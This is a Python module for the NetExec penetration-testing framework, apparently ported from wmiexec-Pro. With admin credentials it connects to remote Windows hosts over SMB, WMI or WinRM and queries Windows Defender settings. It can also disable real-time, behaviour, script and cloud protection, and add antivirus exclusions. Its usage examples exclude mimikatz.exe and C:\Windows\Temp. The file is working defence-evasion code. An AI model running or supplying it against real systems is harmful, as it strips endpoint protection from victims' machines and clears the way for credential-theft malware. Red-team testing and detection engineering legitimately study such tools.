from sys import exit

from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Windows Defender management via the MSFT_MpPreference WMI class
    (namespace root/Microsoft/Windows/Defender).

    Module by @XiaoliChan, ported from wmiexec-Pro:
    https://github.com/XiaoliChan/wmiexec-Pro

    disable/enable/exclude/remove use kwargs-style WMI method calling
    (only supplied InParams are sent, unspecified ones are marked null),
    which requires the impacket wmi-Call branch (pending upstream PR).
    """

    name = "defender"
    description = "Manage Windows Defender via MSFT_MpPreference: check status, disable/enable protection, add/remove exclusions"
    supported_protocols = ["smb", "wmi", "winrm"]
    category = CATEGORY.PRIVILEGE_ESCALATION

    NAMESPACE = "//./root/Microsoft/Windows/Defender"

    # Core protection booleans - True means that feature is disabled
    PROTECTION_FIELDS = [
        "DisableRealtimeMonitoring",
        "DisableBehaviorMonitoring",
        "DisableIOAVProtection",
        "DisableScriptScanning",
        "DisableBlockAtFirstSeen",
        "DisableIntrusionPreventionSystem",
        "DisableArchiveScanning",
        "DisableRemovableDriveScanning",
        "DisableEmailScanning",
        "DisableScanningNetworkFiles",
    ]

    # Cloud / PUA enum overrides. Disable -> minimum protection; enable -> Microsoft defaults
    CLOUD_FIELDS_DISABLE = {"MAPSReporting": 0, "SubmitSamplesConsent": 2, "PUAProtection": 0}
    CLOUD_FIELDS_ENABLE = {"MAPSReporting": 2, "SubmitSamplesConsent": 1, "PUAProtection": 1}

    ENUM_DECODERS = {
        "MAPSReporting": {0: "Disabled", 1: "Basic", 2: "Advanced"},
        "SubmitSamplesConsent": {0: "AlwaysPrompt", 1: "SendSafe", 2: "NeverSend", 3: "SendAll"},
        "PUAProtection": {0: "Disabled", 1: "Enabled", 2: "AuditMode"},
    }

    EXCLUSION_FIELDS = [
        ("ExclusionPath", "Path"),
        ("ExclusionProcess", "Process"),
        ("ExclusionExtension", "Extension"),
    ]

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = "check"
        self.path = self.process = self.extension = None

    def options(self, context, module_options):
        r"""
        ACTION      Action to perform (default: check)
                      check:   show protection status and exclusions
                      disable: disable all core protection features
                      enable:  re-enable core protection features
                      exclude: add an exclusion
                      remove:  remove an exclusion
        PATH        Exclusion directory path (e.g. C:\\temp), used with ACTION=exclude|remove
        PROCESS     Exclusion process name (e.g. mimikatz.exe), used with ACTION=exclude|remove
        EXTENSION   Exclusion file extension (e.g. exe), used with ACTION=exclude|remove

        Note: on some systems (e.g. Windows 11 as local admin) ACTION=disable/enable
        does not take effect (blocked by Defender Tamper Protection) while
        ACTION=exclude still works. The module verifies the result and reports
        how many settings did not change.

        Usage:
            netexec wmi 192.168.1.1 -u user -p pass -M defender
            netexec smb 192.168.1.1 -u user -p pass -M defender -o ACTION=check
            netexec wmi 192.168.1.1 -u user -p pass -M defender -o ACTION=disable
            netexec smb 192.168.1.1 -u user -p pass -M defender -o ACTION=enable

            netexec wmi 192.168.1.1 -u user -p pass -M defender -o ACTION=exclude PATH=C:\\Windows\\Temp
            netexec smb 192.168.1.1 -u user -p pass -M defender -o ACTION=remove PATH=C:\\Windows\\Temp
            netexec wmi 192.168.1.1 -u user -p pass -M defender -o ACTION=exclude PROCESS=mimikatz.exe
            netexec smb 192.168.1.1 -u user -p pass -M defender -o ACTION=remove PROCESS=mimikatz.exe
            netexec wmi 192.168.1.1 -u user -p pass -M defender -o ACTION=exclude EXTENSION=exe
            netexec smb 192.168.1.1 -u user -p pass -M defender -o ACTION=remove EXTENSION=exe
            netexec wmi 192.168.1.1 -u user -p pass -M defender -o ACTION=exclude PATH=C:\\Windows\\Temp PROCESS=mimikatz.exe EXTENSION=exe
            netexec smb 192.168.1.1 -u user -p pass -M defender -o ACTION=remove PATH=C:\\Windows\\Temp PROCESS=mimikatz.exe EXTENSION=exe
        """
        self.action = module_options.get("ACTION", "check").lower()
        if self.action not in ("check", "disable", "enable", "exclude", "remove"):
            context.log.fail("ACTION must be one of: check, disable, enable, exclude, remove")
            exit(1)

        self.path = module_options.get("PATH")
        self.process = module_options.get("PROCESS")
        self.extension = module_options.get("EXTENSION")

        if self.action in ("exclude", "remove") and not any([self.path, self.process, self.extension]):
            context.log.fail("ACTION=exclude|remove requires at least one of PATH, PROCESS or EXTENSION")
            exit(1)

    def on_admin_login(self, context, connection):
        if context.protocol == "winrm":
            DefenderWinRM(context, connection, self).run()
            return

        if context.protocol == "wmi":
            # The wmi protocol holds an authenticated IWbemLevel1Login after check_if_admin
            self.run(context, connection.iWbemLevel1Login)
            return

        remote_name = connection.host if not connection.kerberos else f"{connection.hostname}.{connection.domain}"
        dcom = DCOMConnection(
            remote_name,
            connection.username,
            connection.password if connection.password else "",
            connection.domain,
            connection.lmhash,
            connection.nthash,
            connection.aesKey,
            oxidResolver=True,
            doKerberos=connection.kerberos,
            kdcHost=connection.kdcHost,
            remoteHost=connection.host,
        )
        try:
            i_interface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            self.run(context, wmi.IWbemLevel1Login(i_interface))
        except Exception as e:
            context.log.fail(f"DCOM connection failed: {e}")
        finally:
            dcom.disconnect()

    def run(self, context, iWbemLevel1Login):
        try:
            iWbemServices = iWbemLevel1Login.NTLMLogin(self.NAMESPACE, NULL, NULL)
            iWbemLevel1Login.RemRelease()
            iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        except Exception as e:
            context.log.fail(f"Failed to connect to the Defender namespace (Defender installed?): {e}")
            return

        if self.action == "check":
            self.check(context, iWbemServices)
        elif self.action in ("disable", "enable"):
            self.set_core_protection(context, iWbemServices, self.action == "enable")
        else:
            self.toggle_exclusion(context, iWbemServices, self.action == "exclude")

    def get_preferences(self, iWbemServices):
        iEnumWbemClassObject = iWbemServices.ExecQuery("SELECT * FROM MSFT_MpPreference")
        obj = iEnumWbemClassObject.Next(0xFFFFFFFF, 1)[0]
        return dict(obj.getProperties())

    @staticmethod
    def prop_value(props, field):
        value = props.get(field, {}).get("value")
        if isinstance(value, str) and value in ("True", "False"):
            return value == "True"
        return value

    def print_protection(self, context, props):
        context.log.display("Protection status:")
        for field in self.PROTECTION_FIELDS:
            value = self.prop_value(props, field)
            if value is None:
                value = "N/A"
            status = "DISABLED" if value is True else ("ENABLED" if value is False else str(value))
            context.log.highlight(f"  {field:<36} {status}")

        for field, decoder in self.ENUM_DECODERS.items():
            raw = props.get(field, {}).get("value")
            label = decoder.get(raw, str(raw) if raw is not None else "N/A")
            context.log.highlight(f"  {field:<36} {label} ({raw})")

    def check(self, context, iWbemServices):
        try:
            props = self.get_preferences(iWbemServices)
        except Exception as e:
            context.log.fail(f"Failed to query MSFT_MpPreference: {e}")
            return

        self.print_protection(context, props)

        context.log.display("Exclusions:")
        found = False
        for field, label in self.EXCLUSION_FIELDS:
            values = props.get(field, {}).get("value")
            if not values:
                continue
            if not isinstance(values, list):
                values = [values]
            found = True
            for value in values:
                context.log.highlight(f"  [{label}] {value}")
        if not found:
            context.log.highlight("  (none)")

    def invoke_class_method(self, context, iWbemServices, method, kwargs):
        """Call a class-level MSFT_MpPreference method sending only the given InParams.

        MSFT_MpPreference is a singleton class without a key property, so the
        method is invoked on the class object returned by GetObject. Unspecified
        InParams are marked null, preserving the existing Defender configuration.
        """
        try:
            mp_preference, _ = iWbemServices.GetObject("MSFT_MpPreference")
            getattr(mp_preference, method)(**kwargs)
            return True
        except TypeError as e:
            if "keyword argument" in str(e):
                context.log.fail(f"ACTION={self.action} requires the impacket wmi-Call branch (kwargs-style WMI method calling)")
            else:
                context.log.fail(f"Failed to call MSFT_MpPreference.{method}: {e}")
        except AttributeError as e:
            context.log.fail(f"Method {method} not found on MSFT_MpPreference: {e}")
        except Exception as e:
            context.log.fail(f"Failed to call MSFT_MpPreference.{method}: {e}")
        return False

    def set_core_protection(self, context, iWbemServices, enable):
        action_str = "Enabling" if enable else "Disabling"
        context.log.display(f"{action_str} core protection features...")

        overrides = dict.fromkeys(self.PROTECTION_FIELDS, not enable)
        overrides.update(self.CLOUD_FIELDS_ENABLE if enable else self.CLOUD_FIELDS_DISABLE)

        if self.invoke_class_method(context, iWbemServices, "Set", overrides):
            context.log.success(f"Core protection features {self.action}d")

        context.log.display("Verifying...")
        context.log.display("Note: on some systems (e.g. Windows 11 as local admin) disable/enable is blocked by Defender Tamper Protection, while exclusions still work - prefer ACTION=exclude there")
        try:
            props = self.get_preferences(iWbemServices)
            self.print_protection(context, props)
            # PROTECTION_FIELDS are Disable* flags: value True means protection
            # disabled, so the expected value after Set is `not enable`
            stale = [field for field in self.PROTECTION_FIELDS if isinstance(value := self.prop_value(props, field), bool) and value != (not enable)]
            if stale:
                context.log.fail(f"{len(stale)} of {len(self.PROTECTION_FIELDS)} protection settings did not change (first: {stale[0]})")
        except Exception as e:
            context.log.debug(f"Could not verify settings: {e}")

    def toggle_exclusion(self, context, iWbemServices, add):
        kwargs = {}
        if self.path:
            kwargs["ExclusionPath"] = [self.path]
        if self.process:
            kwargs["ExclusionProcess"] = [self.process]
        if self.extension:
            kwargs["ExclusionExtension"] = [self.extension]

        verb = "Adding" if add else "Removing"
        for label, value in (("path", self.path), ("process", self.process), ("extension", self.extension)):
            if value:
                context.log.display(f"{verb} exclusion {label}: {value}")

        method = "Add" if add else "Remove"
        verb = "added" if add else "removed"
        if self.invoke_class_method(context, iWbemServices, method, kwargs):
            context.log.success(f"Exclusion {verb} successfully")


class DefenderWinRM:
    """Windows Defender management natively over WS-Management.

    Queries and method calls go through the winrm protocol's
    wql_enumerate / wmi_invoke: no PowerShell runspace, no DCOM.
    """

    NAMESPACE = "root\\Microsoft\\Windows\\Defender"

    def __init__(self, context, connection, module):
        self.context = context
        self.connection = connection
        self.logger = context.log
        self.module = module

    def run(self):
        action = self.module.action
        if action == "check":
            self.check()
        elif action in ("disable", "enable"):
            self.set_core_protection(action == "enable")
        else:
            self.toggle_exclusion(action == "exclude")

    def get_preferences(self):
        records = self.connection.wql_enumerate(
            "SELECT * FROM MSFT_MpPreference",
            self.NAMESPACE,
        )
        return records[0] if records else {}

    def check(self):
        try:
            props = self.get_preferences()
        except Exception as e:
            self.logger.fail(f"Failed to query MSFT_MpPreference: {e}")
            return

        self.module.print_protection(self.context, self._to_dcom_format(props))

        self.logger.display("Exclusions:")
        found = False
        for field, label in self.module.EXCLUSION_FIELDS:
            values = props.get(field)
            if not values:
                continue
            if not isinstance(values, list):
                values = [values]
            found = True
            for value in values:
                self.logger.highlight(f"  [{label}] {value}")
        if not found:
            self.logger.highlight("  (none)")

    def _to_dcom_format(self, props):
        """Adapt the flat wql_enumerate record to the {field: {value: v}}
        shape the shared formatting helpers consume.
        """
        return {k: {"value": v} for k, v in props.items()}

    def invoke_method(self, method, params):
        try:
            result = self.connection.wmi_invoke(
                self.NAMESPACE,
                "MSFT_MpPreference",
                method,
                params,
            )
            return str(result.get("ReturnValue")) == "0"
        except Exception as e:
            self.logger.fail(f"Failed to call MSFT_MpPreference.{method}: {e}")
            return False

    def set_core_protection(self, enable):
        action_str = "Enabling" if enable else "Disabling"
        self.logger.display(f"{action_str} core protection features...")

        overrides = dict.fromkeys(self.module.PROTECTION_FIELDS, not enable)
        overrides.update(self.module.CLOUD_FIELDS_ENABLE if enable else self.module.CLOUD_FIELDS_DISABLE)

        if self.invoke_method("Set", overrides):
            self.logger.success(f"Core protection features {'enabled' if enable else 'disabled'}")

        self.logger.display("Verifying...")
        self.logger.display("Note: on some systems (e.g. Windows 11 as local admin) disable/enable is blocked by Defender Tamper Protection, while exclusions still work - prefer ACTION=exclude there")
        try:
            props = self.get_preferences()
            self.module.print_protection(self.context, self._to_dcom_format(props))
            stale = [field for field in self.module.PROTECTION_FIELDS if isinstance(value := self.module.prop_value({k: {"value": v} for k, v in props.items()}, field), bool) and value != (not enable)]
            if stale:
                self.logger.fail(f"{len(stale)} of {len(self.module.PROTECTION_FIELDS)} protection settings did not change (first: {stale[0]})")
        except Exception as e:
            self.logger.debug(f"Could not verify settings: {e}")

    def toggle_exclusion(self, add):
        params = {}
        if self.module.path:
            params["ExclusionPath"] = [self.module.path]
        if self.module.process:
            params["ExclusionProcess"] = [self.module.process]
        if self.module.extension:
            params["ExclusionExtension"] = [self.module.extension]

        verb = "Adding" if add else "Removing"
        for label, value in (("path", self.module.path), ("process", self.module.process), ("extension", self.module.extension)):
            if value:
                self.logger.display(f"{verb} exclusion {label}: {value}")

        method = "Add" if add else "Remove"
        verb_past = "added" if add else "removed"
        if self.invoke_method(method, params):
            self.logger.success(f"Exclusion {verb_past} successfully")
